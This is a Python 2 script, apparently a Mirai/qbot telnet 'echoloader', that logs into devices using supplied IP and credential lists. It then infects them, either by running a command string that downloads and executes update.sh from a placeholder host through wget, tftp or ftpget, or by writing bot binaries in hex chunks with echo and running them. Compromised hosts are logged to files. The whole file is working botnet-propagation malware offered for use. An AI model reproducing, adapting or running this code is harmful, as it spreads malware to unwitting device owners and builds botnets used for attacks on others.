#!/usr/bin/python
#Phaaaat hax telnet loader by Freak/Milenko

import sys, re, os, socket, time, select
from threading import Thread

rekdevice = "cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /root || cd /; wget http://0.0.0.0/update.sh; busybox wget http://0.0.0.0/update.sh; tftp -r update.sh -g 0.0.0.0; busybox tftp -r update.sh -g 0.0.0.0; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh; chmod 777 update.sh; busybox chmod 777 update.sh; sh update.sh; rm -rf update.sh"

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")

print "\033[31m"

print "S-S-SUUUPER fast telnet echoloader by Freak"
print
print "Reads ip:port user:pass and simply checks the IP for port 23 then echoloads mirai/qbot binaries"
print "ensure the binaries are in the \"bins\" directory under the proper dlr.ARCH filenames."
print "All working telnets are saved to \"bots.txt\""

threads = int(raw_input("Threads: "))

lines = open(sys.argv[1],"r").readlines()
import random
random.shuffle(lines)

global fh
fh = open("bots.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]

running = 0

global echo
global tftp
global wget
global logins
global ran
tftp = 0
wget = 0
echo = 0
logins = 0
ran = 0
def printStatus():
    global echo
    global tftp
    global wget
    global logins
    global ran
    while 1:
        time.sleep(5)
        print "\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m"

def readUntil(tn, advances, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        for advance in advances:
            if advance in buf: return buf
    return ""

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

def contains(data, array):
    for test in array:
        if test in data:
            return True
    return False

def split_bytes(s, n):
    assert n >= 4
    start = 0
    lens = len(s)
    while start < lens:
        if lens - start <= n:
            yield s[start:]
            return # StopIteration
        end = start + n
        assert end > start
        yield s[start:end]
        start = end

def infect(ip, username, password):
    global echo
    global tftp
    global wget
    global logins
    global ran
    infectedkey = "CAPSAICIN"
    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(0.5)
        tn.connect((ip, 23))
    except:
        try:
            tn.close()
        except:
            pass
        return
    try:
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(username + "\n")
            time.sleep(0.1)
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(password + "\n")
            time.sleep(0.8)
        else:
            pass
        prompt = ''
        prompt += recvTimeout(tn, 8192)
        if ">" in prompt and "ONT" not in prompt:
            success = True
        elif "#" in prompt or "$" in prompt or "@" in prompt or ">" in prompt:
            success = True
        else:
            tn.close()
            return
    except:
        tn.close()
        return
    if success == True:
        try:
            tn.send("enable\r\n")
            tn.send("system\r\n")
            tn.send("shell\r\n")
            tn.send("sh\r\n")
            tn.send("echo -e '\\x41\\x4b\\x34\\x37'\r\n")
        except:
            tn.close()
            return
        time.sleep(1)
        try:
            buf = recvTimeout(tn, 8192)
        except:
            tn.close()
            return
        if "AK47" in buf:
            print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip)
            logins += 1
            fh.write(ip + ":23 " + username + ":" + password + "\n")
            fh.flush()
#            tn.send(rekdevice + "\r\n")
#            time.sleep(15)
            buf = "" #recvTimeout(tn, 1024*1024)
            loaded = False
            if "bytes" in buf:
                print "\033[32m[\033[31m+\033[32m] \033[33mTFTP \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip)
                tftp += 1
                loaded = True
            elif "saved" in buf:
                print "\033[32m[\033[31m+\033[32m] \033[33mWGET \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip)
                wget += 1
                loaded = True
            if infectedkey in buf:
                ran += 1
                print "\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip)
                f=open("infected.txt", "a")
                f.write(ip +":23 " + username + ":" + password + "\r\n")
                f.close()
            if loaded:
                tn.close()
                return
            tn.send("cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /root || cd /\r\n")
            tn.send("cat /proc/mounts||busybox cat /proc/mounts\r\n")
            mounts = recvTimeout(tn, 1024*1024)
            for line in mounts.split("\n"):
                try:
                    path = line.split(" ")[1]
                    if " rw" in line:
                        tn.send("echo -e '%s' > %s/.keksec||busybox echo -e '%s' > %s/.keksec; cat %s/.keksec||busybox cat %s/.keksec; rm %s/.keksec||busybox rm %s/.keksec\r\n" % ("\\x41\\x4b\\x34\\x37", path, "\\x41\\x4b\\x34\\x37", path, path, path, path, path))
                        if "AK47" in recvTimeout(tn, 1024*1024):
                            tn.send("cd %s\r\n" % path) #cd into the writeable directory
                except:
                    continue
            for binary in "dlr.arm dlr.arm7 dlr.mips dlr.ppc dlr.x86 dlr.m68k dlr.mpsl dlr.sh4 dlr.spc".split(" "):
                binloaded = False
                while binloaded == False:
                    try:
                        first = True
                        count = 0
                        hexdata = []
                        for chunk in split_bytes(open("bins/" + binary, "rb").read(), 128):
                            hexdata.append(''.join(map(lambda c:'\\x%02x'%c, map(ord, chunk))))
                        parts = len(hexdata)
                        for hexchunk in hexdata:
                            seq = ">" if first else ">>"
                            tn.send("echo -ne '" + hexchunk + "' " + seq + " updDl\r\n")
                            first = False
                            count += 1
                            time.sleep(0.01)
                        print "\033[32m[\033[31m+\033[32m] \033[33mECHO \033[31m---> \033[32m" + ip + " \033[31m---> \033[36m(" + str(count) + "/" + str(parts) + ") " + binary + "\033[37m"
                        tn.send("chmod 777 updDl||busybox chmod 777 updDl\r\n")
                        tn.send("./updDl\r\n")
                        time.sleep(3)
                        tn.send("rm -rf ./updDl\r\n")
                        time.sleep(0.1)
                        tn.send("./dvrHelper\r\n")
                        time.sleep(1)
                        tn.send("rm -rf ./dvrHelper\r\n")
                        time.sleep(0.1)
                        buf = recvTimeout(tn, 1024*1024)
                        if "FIN" in buf:
                            echo += 1
                            print "\033[32m[\033[31m+\033[32m] \033[33mECHOLOADED \033[31m---> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[31m ---> \033[35m%s\033[37m" %(username, password, ip, binary)
                            tn.close()
                            f=open("echoes.txt","a")
                            f.write(ip +":23 " + username + ":" + password + "\r\n")
                            f.close()
                            return
                        if infectedkey in buf:
                            ran += 1
                            f=open("infected.txt", "a")
                            f.write(ip +":23 " + username + ":" + password + "\r\n")
                            f.close()
                            print "\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip)
                            tn.close()
                            return
                        binloaded = True
                    except:
                        pass
    else:
        tn.close()
        return

def check(chunk, fh):
    global running
    running += 1
    threadID = running
    for login in chunk:
        try:
            if ":23 " in login:
                login = login.replace(":23 ", ":")
            if ":2323 " in login:
                login = login.replace(":2323 ", ":")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            try:
                socket.inet_aton(login.split(":")[0])
                ip = login.split(":")[0]
                username = login.split(":")[1]
                password = login.split(":")[2]
            except:
                try:
                    socket.inet_aton(login.split(":")[2])
                    ip = login.split(":")[2]
                    username = login.split(":")[0]
                    password = login.split(":")[1]
                except:
                    continue
            s.connect((ip, 23))
            s.close()
            infect(ip, username, password)
        except:
            pass
    print "\033[32m[\033[31m+\033[32m] Thread " + str(threadID) + " has finished scanning " + str(len(chunk)) + " IPs."
    running -= 1

lines = map(lambda s: s.strip(), lines) # remove all newlines
import random
random.shuffle(lines)
chunks = chunkify(lines, threads) # make seperate chunk for each thread

print "STARTING SCAN AND LOAD!!!"

Thread(target = printStatus, args = ()).start()

for thread in xrange(0,threads):
    if thread >= 384:
        time.sleep(0.2)
    try:
        Thread(target = check, args = (chunks[thread], fh,)).start()
    except:
        pass
print "Scanning... Press enter 3 times to stop."

for i in range(0,3):
    raw_input()

fh.close()

os.kill(os.getpid(), 9)